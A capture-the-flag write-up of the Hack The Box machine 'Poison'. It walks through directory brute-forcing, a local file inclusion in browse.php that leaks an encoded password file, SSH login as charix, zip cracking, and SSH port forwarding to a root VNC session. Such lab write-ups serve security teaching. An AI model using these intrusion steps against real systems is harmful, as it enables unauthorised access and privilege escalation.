---
title: HTB -- Poison
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/poison/teaser.png
excerpt: Poison is a website with some basic php functionality. From exploring these pages, an LFI is exposed which is used to leak poorly "encrypted" credentials. With these credentials a user shell is found, and a root process running locally is discovered. After port fowarding and finding some VNC credentials, you can login to the root session.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - web
  - port fowarding
---

# Summary
<img src="/assets/images/htb/poison/teaser.png" width="80" height="80"/>

Poison is a website with some basic php functionality. From exploring these pages, an LFI is exposed which is used to leak poorly "encrypted" credentials. With these credentials a user shell is found, and a root process running locally is discovered. After port fowarding and finding some VNC credentials, you can login to the root session.

## Recon

Scans show us a web box running ssh.

```
Initiating Ping Scan at 10:04
Scanning 10.10.10.84 [2 ports]
Completed Ping Scan at 10:04, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 10:04
Scanning poison.htb (10.10.10.84) [2 ports]
Discovered open port 22/tcp on 10.10.10.84
Discovered open port 80/tcp on 10.10.10.84
Completed Connect Scan at 10:04, 0.01s elapsed (2 total ports)
Nmap scan report for poison.htb (10.10.10.84)
Host is up, received conn-refused (0.012s latency).
Scanned at 2022-01-02 10:04:05 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

## Web

![](/assets/images/htb/poison/web.png)

Interesting, lets check subdomains and due to the explicit php extension extend our default dirbust to include `.php`

* Subdomain scan
  * `ffuf -w ~/subdomains-top1million-110000.txt -u http://10.10.10.84 -H "Host: FUZZ.poison.htb" | grep -v '200'`
  * No results returned
* Brute force
  * The landing page has mentions of php, so we add the `-x php` flag to check for php files
  * `feroxbuster -u http://poison.htb -e -r -x php txt`

```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://poison.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l       15w      157c http://poison.htb/info.php
200        4l       30w      321c http://poison.htb/browse.php
200       12l       30w      289c http://poison.htb/index.php
200      983l     1883w        0c http://poison.htb/ini.php
200      715l     4157w        0c http://poison.htb/phpinfo.php
[####################] - 57s    90003/90003   0s      found:5       errors:0      
[####################] - 57s    90003/90003   1570/s  http://poison.htb
```
Let's check these pages out

info.php looks to be a banner with information about the os.
```php
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
```
browse.php throws an error! Come back to this
```php
<br />
<b>Warning</b>:  include(): Filename cannot be empty in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '' for inclusion (include_path='.:/usr/local/www/apache24/data') in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
```
index.php we saw before, it has a GET request for the previously explored `browse.php`
```php
<html>
<body>
<h1>Temporary website to test local .php scripts.</h1>
Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php

</body>
</html>

<form action="/browse.php" method="GET">
	Scriptname: <input type="text" name="file"><br>
	<input type="submit" value="Submit">
</form>
```
`ini.php` is some ugly code
```
Array ( [allow_url_fopen] => Array ( [global_value] => 1 [local_value] => 1 [access] => 4 ) [allow_url_include] => Array ( [global_value] => 0 [local_value] => 0 [access] => 4 ) [always_populate_raw_post_data] => Array ( [global_value] => 0 [local_value] => 0 [access] => 6 ) [arg_separator.input] => Array ( [global_value] => & [local_value] => & [access] => 6 ) [arg_separator.output] => Array ( [global_value] => & [local_value] => & [access] => 7 )
```
The classic `phpinfo.php` gives us a boatload of info. Notably PHP uploads being enabled is a huge hint that LFI likely exists as file uploads must be manually enabled.

Remember that weird looking error page from `browse.php`? Time to return for further investigation. One of the first things to try is leaking files up directories, which works like a charm!
![](/assets/images/htb/poison/leak.png)

Lets say this didn't work out and completely failed. What would we try next? One idea could be [fuzzing LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion) with wordlists which saves alot of time when the method of LFI is more complex. 

Keep digging for clues, there one one page we missed which showed up in the initial landing page but was missed with our subdirectory brute force, `listfiles.php`.

[http://poison.htb/browse.php?file=listfiles.php](http://poison.htb/browse.php?file=listfiles.php) contains `Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )`

Lets leak `pwdbackup.txt` with the LFI we found earlier!
[http://poison.htb/browse.php?file=pwdbackup.txt](http://poison.htb/browse.php?file=pwdbackup.txt)

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```

Encoded 13 times? Quite the excessive recreational use of hashing algorithms. [Cyberchef](https://gchq.github.io/CyberChef/) tears it apart.

![](/assets/images/htb/poison/web-1.png)
Good thing we found `/etc/passwd` earlier, gives us all the usernames we might want to try although the password itself suggests the user Charix. Sure enough `ssh charix@poison.htb`

![](/assets/images/htb/poison/web-2.png)

# Privesc

Initially there is a juicy looking `secret.zip` file. Once we wget secret.zip off the box, it's password protected!
`fcrackzip -u -D -p ~/rockyou.txt secret.zip`

Went down a rabbit hole here, just use the same password for the user to get a secret file. No clue what it is.

## Lipeas

Linpeas points us to the root crontab
```
# /etc/crontab - root's crontab for FreeBSD
#
# $FreeBSD: releng/11.1/etc/crontab 194170 2009-06-14 06:37:19Z brian $
#
SHELL=/bin/sh
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin
#
#minute hour    mday    month   wday    who     command
#
*/5     *       *       *       *       root    /usr/libexec/atrun
#
# Save some entropy so that /dev/random can re-seed on boot.
*/11    *       *       *       *       operator /usr/libexec/save-entropy
#
# Rotate log files every hour, if necessary.
0       *       *       *       *       root    newsyslog
#
# Perform daily/weekly/monthly maintenance.
1       3       *       *       *       root    periodic daily
15      4       *       *       6       root    periodic weekly
30      5       1       *       *       root    periodic monthly
#
# Adjust the time zone if the CMOS clock keeps local time, as opposed to
# UTC time.  See adjkerntz(8) for details.
1,31    0-5     *       *       *       root    adjkerntz -a
```

Overwiting these won't work -- keep going

## Processes as Root
```
charix@Poison:/tmp % ps aux | grep root                                                                                                      
root      11 100.0  0.0      0    16  -  RL   16:03   91:12.70 [idle]
root       0   0.0  0.0      0   160  -  DLs  16:03    0:00.01 [kernel]
root     319   0.0  0.5   9560  5052  -  Ss   16:04    0:00.27 /sbin/devd                          
root     390   0.0  0.2  10500  2448  -  Ss   16:04    0:00.12 /usr/sbin/syslogd -s                
root     543   0.0  0.5  56320  5404  -  S    16:04    0:03.01 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/l
root     620   0.0  0.7  57812  7052  -  Is   16:04    0:00.00 /usr/sbin/sshd           
root     625   0.0  1.1  99172 11516  -  Ss   16:05    0:00.27 /usr/local/sbin/httpd -DNOHTTPACCEPT
root     642   0.0  0.6  20636  6140  -  Ss   16:06    0:00.07 sendmail: accepting connections (sendmail)      
root     649   0.0  0.2  12592  2436  -  Is   16:06    0:00.02 /usr/sbin/cron -s
root    1033   0.0  0.8  85228  7772  -  Is   16:53    0:00.01 sshd: charix [priv] (sshd)
root     529   0.0  0.9  23620  8868 v0- I    16:04    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xaut
root     540   0.0  0.7  67220  7056 v0- I    16:04    0:00.01 xterm -geometry 80x24+10+10 -ls -title X Desktop
root     541   0.0  0.5  37620  5312 v0- I    16:04    0:00.01 twm
root     696   0.0  0.2  10484  2076 v0  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv0
root     697   0.0  0.2  10484  2076 v1  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv1
root     698   0.0  0.2  10484  2076 v2  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv2
root     699   0.0  0.2  10484  2076 v3  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv3
root     700   0.0  0.2  10484  2076 v4  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv4
root     701   0.0  0.2  10484  2076 v5  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv5
root     702   0.0  0.2  10484  2076 v6  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv6
root     703   0.0  0.2  10484  2076 v7  Is+  16:06    0:00.00 /usr/libexec/getty Pc ttyv7
root     569   0.0  0.4  19660  3616  0  Is+  16:04    0:00.01 -csh (csh)
charix 30057   0.0  0.0    412   328  1  R+   17:39    0:00.00 grep root
```

Wait, what is `root     529   0.0  0.9  23620  8868 v0- I    16:04    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauth`? Time to inspect further with a networking view.

## Netstat
FreeBSD changes the syntax for `netstat -tulpn`, which shows networking information.
```
charix@Poison:/tmp % netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.14.24.46306      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

`5801` is a common Xvnc port, meaning it should be the root Xvnc we found earlier. We have a few options to expose this for our  own access with the secret file we found earlier.

### Breaking into VNC

[port fowarding refresher](https://www.ssh.com/academy/ssh/tunneling/example)

* Known information
  * Locally running Xvnc as root
  * secret.zip gave us a secret for something

There are a few hurdles here, first port forwarding. We have a few options, but since binaries wont work to boot (such as chisel), we can simply use ssh.
```
ssh -L 4444:127.0.0.1:5901 charix@10.10.10.84
       ^ local port   ^ remote port
```

Using a bind command with `-L`, we can effectively make our local hosts port `4444` become poisons locally interfaced `5901`.
Once we have forwarded the port, we can access VNC on `127.0.0.1:4444`
```
vncviewer 127.0.0.1:4444
```
Fails! The questions of root credentials come into play. Maby there is an option for that secret file we cracked earlier? `-passwd` looks promising
```
$ vncviewer --help                          
TightVNC Viewer version 1.3.10

Usage: vncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       vncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       vncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       vncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
        -encodings <ENCODING-LIST> (e.g. "tight copyrect")
        -bgr233
        -owncmap
        -truecolour
        -depth <DEPTH>
        -compresslevel <COMPRESS-VALUE> (0..9: 0-fast, 9-best)
        -quality <JPEG-QUALITY-VALUE> (0..9: 0-low, 9-high)
        -nojpeg
        -nocursorshape
        -x11cursor
        -autopass

Option names may be abbreviated, e.g. -bgr instead of -bgr233.
See the manual page for more information.
```
Sure enough, we can gain access to root with the following command
```
vncviewer 127.0.0.1:4444 -passwd secret
```

Doing a port-mortem it turns out there was another path to user access via log poisoning (the name poison.htb finally makes sense). [Read all about 0xdf's exploration of it here](https://0xdf.gitlab.io/2018/09/08/htb-poison.html#web-shell-via-log-poisoning).

# Lessons Learned

* Not all attack vectors are used, sometimes there are multiple routes to victory
* Pasword reuse > brute forcing! Wasted a while cracking `secret.zip`
